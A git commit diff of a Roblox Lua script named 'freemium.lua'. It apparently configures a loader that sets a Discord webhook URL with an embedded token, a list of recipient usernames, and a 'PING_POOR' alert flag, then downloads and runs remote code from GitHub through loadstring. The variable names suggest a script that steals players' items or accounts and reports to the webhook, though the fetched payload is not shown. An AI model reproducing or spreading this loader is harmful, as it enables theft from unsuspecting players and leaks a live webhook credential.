3fcc3acd7c46b5e8485248b0ae22a74f4b726741
ks2006babyy-dev <ks2006babyy@gmail.com>
2026-04-16 15:19:40 +0000

    Update freemium.lua

--- freemium.lua
+++ freemium.lua
@@ -1,11 +1,10 @@
--- Final Loader (Fixed Webhook)
+-- Final Loader
 
 _G.POOR_WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUE"
 
 _G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}
--- Change "username" to any of your Roblox usernames if you want
 
-_G.PING_POOR = true   -- true = loud @everyone ping | false = no ping
+_G.PING_POOR = true
 
 task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
